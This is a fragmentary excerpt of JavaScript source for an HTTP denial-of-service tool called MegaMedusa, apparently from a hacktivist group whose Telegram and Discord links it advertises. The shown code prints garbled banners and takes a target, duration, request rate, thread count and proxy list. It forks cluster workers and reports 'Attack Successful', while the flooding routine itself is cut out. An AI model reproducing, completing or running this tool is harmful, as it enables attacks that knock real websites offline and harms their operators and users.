...
if (process.argv.length < 7) {
    console.log('   ');
    console.log('        \x1b[0mÔûæÔûêÔûÇÔûäÔûÇÔûê ÔûêÔûÇÔûÇ ÔûêÔûÇÔûÇÔûÇ ÔûêÔûÇÔûÇÔûê ÔûæÔûêÔûÇÔûäÔûÇÔûê ÔûêÔûÇÔûÇ ÔûêÔûÇÔûÇÔûä ÔûêÔöÇÔöÇÔûê ÔûêÔûÇÔûÇ ÔûêÔûÇÔûÇÔûê ');
    console.log('        \x1b[0mÔûæÔûêÔûæÔûêÔûæÔûê ÔûêÔûÇÔûÇ ÔûêÔöÇÔûÇÔûê ÔûêÔûäÔûäÔûê ÔûæÔûêÔûæÔûêÔûæÔûê ÔûêÔûÇÔûÇ ÔûêÔöÇÔöÇÔûê ÔûêÔöÇÔöÇÔûê ÔûÇÔûÇÔûê ÔûêÔûäÔûäÔûê   ');
    console.log('        \x1b[0mÔûæÔûêÔöÇÔöÇÔûæÔûê ÔûÇÔûÇÔûÇ ÔûÇÔûÇÔûÇÔûÇ ÔûÇÔöÇÔöÇÔûÇ ÔûæÔûêÔöÇÔöÇÔûæÔûê ÔûÇÔûÇÔûÇ ÔûÇÔûÇÔûÇÔöÇ ÔöÇÔûÇÔûÇÔûÇ ÔûÇÔûÇÔûÇ ÔûÇÔöÇÔöÇÔûÇ V3.3.1      ');
    console.log(' \x1b[33m   ÔòÜÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòªÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòªÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòØ   ');
    console.log(' \x1b[33m           Ôòæ            \x1b[0mAuthor : \x1b[31mTrashDono              \x1b[33mÔòæ  ');
    console.log(' \x1b[33m           Ôòæ   \x1b[0mDiscord : \x1b[32mhttps://discord.gg/UWdDE73tyD   \x1b[33mÔòæ  ');
    console.log(' \x1b[33m           Ôòæ   \x1b[0mTelegram : \x1b[32mhttps://t.me/RipperSec1337     \x1b[33mÔòæ  ');
    console.log(' \x1b[33m           ÔòÜÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòØ');
...
if (cluster.isMaster) {
    console.clear();
    console.log('');
    console.log('\x1b[0m ÔûæÔûêÔûÇÔûäÔûÇÔûê ÔûêÔûÇÔûÇ ÔûêÔûÇÔûÇÔûÇ ÔûêÔûÇÔûÇÔûê ÔûæÔûêÔûÇÔûäÔûÇÔûê ÔûêÔûÇÔûÇ ÔûêÔûÇÔûÇÔûä ÔûêÔöÇÔöÇÔûê ÔûêÔûÇÔûÇ ÔûêÔûÇÔûÇÔûê ');
    console.log('\x1b[0m ÔûæÔûêÔûæÔûêÔûæÔûê ÔûêÔûÇÔûÇ ÔûêÔöÇÔûÇÔûê ÔûêÔûäÔûäÔûê ÔûæÔûêÔûæÔûêÔûæÔûê ÔûêÔûÇÔûÇ ÔûêÔöÇÔöÇÔûê ÔûêÔöÇÔöÇÔûê ÔûÇÔûÇÔûê ÔûêÔûäÔûäÔûê  ');
    console.log('\x1b[0m ÔûæÔûêÔöÇÔöÇÔûæÔûê ÔûÇÔûÇÔûÇ ÔûÇÔûÇÔûÇÔûÇ ÔûÇÔöÇÔöÇÔûÇ ÔûæÔûêÔöÇÔöÇÔûæÔûê ÔûÇÔûÇÔûÇ ÔûÇÔûÇÔûÇÔöÇ ÔöÇÔûÇÔûÇÔûÇ ÔûÇÔûÇÔûÇ ÔûÇÔöÇÔöÇÔûÇ V3.3.1 ');
    console.log(`\x1b[33m[\x1b[0m+\x1b[33m]\x1b[0m--------------------------------------------\x1b[33m[\x1b[0m+\x1b[33m]`);
    console.log(`\x1b[31m-> \x1b[0mTarget\x1b[33m ÔÜí´©Å : ` + '\x1b[32m' + (process.argv[2] || 'Unknown'));
    console.log(`\x1b[31m-> \x1b[0mTime\x1b[33m ÔÅ│ : ` + '\x1b[32m' + (process.argv[3] || 'Unknown'));
    console.log(`\x1b[31m-> \x1b[0mRate\x1b[33m ­ƒÆú : ` + '\x1b[32m' + (process.argv[4] || 'Unknown'));
    console.log(`\x1b[31m-> \x1b[0mThread\x1b[33m ÔÜÖ´©Å  : ` + '\x1b[32m' + (process.argv[5] || '1'));
    console.log(`\x1b[31m-> \x1b[0mProxyFile\x1b[33m ­ƒùâ : ` + '\x1b[32m' + (process.argv[6] || 'proxy.txt'));
    console.log(`\x1b[33m[\x1b[0m+\x1b[33m]\x1b[0m--------------------------------------------\x1b[33m[\x1b[0m+\x1b[33m]`);
    console.log(`\x1b[31m-> \x1b[0mTelegram\x1b[33m ­ƒùé : ` + '\x1b[32mhttps://t.me/RipperSec1337');
    console.log(`\x1b[31m-> \x1b[0mGithub\x1b[33m ­ƒùé : ` + '\x1b[32mhttps://discord.gg/UWdDE73tyD');
    console.log(`\x1b[31m-> \x1b[0mCheck-Host\x1b[33m ­ƒùé :  ` + '\x1b[32m' + 'https://check-host.net/check-http?host=' + process.argv[2]);
    console.log(`\x1b[33m[\x1b[0m+\x1b[33m]\x1b[0m--------------------------------------------\x1b[33m[\x1b[0m+\x1b[33m]`);
    ...
    setTimeout(() => {
        console.log(`\x1b[33m[\x1b[0m+\x1b[33m]\x1b[0m-----------------------------------------------------------------------------\x1b[33m[\x1b[0m+\x1b[33m]`);
        console.log(`\x1b[31m[\x1b[33mMegaMedusa\x1b[31m] \x1b[32m-> \x1b[33mAttack Successful Ô£à\x1b[0m`);
        process.exit(1);
    }, process.argv[3] * 1000);
} else {
